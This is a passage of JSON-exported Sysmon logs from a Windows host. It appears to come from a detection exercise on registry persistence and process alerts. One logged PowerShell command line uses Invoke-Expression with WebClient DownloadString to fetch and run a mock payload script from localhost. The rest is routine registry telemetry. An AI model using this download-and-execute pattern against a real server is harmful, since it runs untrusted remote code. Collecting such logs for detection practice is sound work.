                       "RecordId":  31873,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:02:08.183",
                       "ProcessGuid":  "{f9ed62ee-1684-6a26-960c-000000009c00}",
                       "ProcessId":  "21032",
                       "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "SetValue",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-158180708-2764993437-2666828097-1001\\\\Device\\HarddiskVolume4\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       "Details":  "Binary Data"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:02:02.4329311-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31872,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:02:02.432",
                       "ProcessGuid":  "{f9ed62ee-f06c-6a25-4401-000000009c00}",
                       "ProcessId":  "11680",
                       "Image":  "C:\\WINDOWS\\system32\\sihost.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
                   },
                   {
                       "EventID":  13,
                       "TimeCreated":  "2026-06-07T22:01:59.0232604-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31871,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:01:59.022",
                       "ProcessGuid":  "{f9ed62ee-2252-6a26-9f0e-000000009c00}",
                       "ProcessId":  "11892",
                       "Image":  "C:\\Users\\nueva\\AppData\\Local\\Programs\\Antigravity IDE\\Antigravity IDE.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "SetValue",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-158180708-2764993437-2666828097-1001\\\\Device\\HarddiskVolume4\\Users\\nueva\\AppData\\Local\\Programs\\Antigravity IDE\\Antigravity IDE.exe",
                       "Details":  "Binary Data"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:01:52.4299725-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31870,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:01:52.429",
                       "ProcessGuid":  "{f9ed62ee-f06c-6a25-4401-000000009c00}",
                       "ProcessId":  "11680",
                       "Image":  "C:\\WINDOWS\\system32\\sihost.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
                   },
                   {
                       "EventID":  13,
                       "TimeCreated":  "2026-06-07T22:01:43.6726318-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31869,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:01:43.671",
                       "ProcessGuid":  "{f9ed62ee-2287-6a26-bc0e-000000009c00}",
                       "ProcessId":  "13836",
                       "Image":  "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "SetValue",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-158180708-2764993437-2666828097-1001\\\\Device\\HarddiskVolume4\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       "Details":  "Binary Data"
                   },
                   {
                       "EventID":  5,
                       "TimeCreated":  "2026-06-07T22:01:43.6722791-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31868,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Cierre_Procesos",
                       "UtcTime":  "2026-06-08 02:01:43.671",
                       "ProcessGuid":  "{f9ed62ee-2287-6a26-bc0e-000000009c00}",
                       "ProcessId":  "13836",
                       "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva"
                   },
                   {
                       "EventID":  1,
                       "TimeCreated":  "2026-06-07T22:01:43.3619349-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31867,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Procesos_Alertas",
                       "UtcTime":  "2026-06-08 02:01:43.360",
                       "ProcessGuid":  "{f9ed62ee-2287-6a26-bc0e-000000009c00}",
                       "ProcessId":  "13836",
                       "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       "CommandLine":  "\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString(\u0027[http://127.0.0.1/mock_payload.ps1](http://127.0.0.1/mock_payload.ps1)\u0027)\"",
                       "CurrentDirectory":  "C:\\Asignacion-Sysmon\\",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "LogonGuid":  "{f9ed62ee-f06b-6a25-7fe7-100000000000}",
                       "LogonId":  "0x10e77f",
                       "TerminalSessionId":  "1",
                       "IntegrityLevel":  "High",
                       "Hashes":  "MD5=A97E6573B97B44C96122BFA543A82EA1,SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46",
                       "ParentProcessGuid":  "{f9ed62ee-1684-6a26-960c-000000009c00}",
                       "ParentProcessId":  "21032",
                       "ParentImage":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       "ParentCommandLine":  "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
                       "ParentUser":  "DESKTOP-KCP6DQD\\nueva"
                   },
                   {
                       "EventID":  13,
                       "TimeCreated":  "2026-06-07T22:01:43.3611812-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31866,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:01:43.357",
                       "ProcessGuid":  "{f9ed62ee-1684-6a26-960c-000000009c00}",
                       "ProcessId":  "21032",
                       "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "SetValue",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-158180708-2764993437-2666828097-1001\\\\Device\\HarddiskVolume4\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       "Details":  "Binary Data"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:01:42.4234183-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31865,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:01:42.423",
                       "ProcessGuid":  "{f9ed62ee-f06c-6a25-4401-000000009c00}",
                       "ProcessId":  "11680",
                       "Image":  "C:\\WINDOWS\\system32\\sihost.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:01:41.3243546-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31864,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:01:41.321",
                       "ProcessGuid":  "{f9ed62ee-f03f-6a25-2f00-000000009c00}",
                       "ProcessId":  "2780",
                       "Image":  "C:\\WINDOWS\\system32\\svchost.exe",
                       "User":  "NT AUTHORITY\\Servicio de red",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
                   },
                   {
                       "EventID":  13,
                       "TimeCreated":  "2026-06-07T22:01:40.3100069-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31863,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:01:40.309",
                       "ProcessGuid":  "{f9ed62ee-f0b0-6a25-e701-000000009c00}",
                       "ProcessId":  "18792",
                       "Image":  "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "SetValue",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-158180708-2764993437-2666828097-1001\\\\Device\\HarddiskVolume4\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                       "Details":  "Binary Data"
                   },
                   {
                       "EventID":  13,
                       "TimeCreated":  "2026-06-07T22:01:38.2365636-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31862,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:01:38.229",
                       "ProcessGuid":  "{f9ed62ee-2063-6a26-690e-000000009c00}",
                       "ProcessId":  "19584",
                       "Image":  "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "SetValue",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-158180708-2764993437-2666828097-1001\\\\Device\\HarddiskVolume4\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                       "Details":  "Binary Data"
                   },
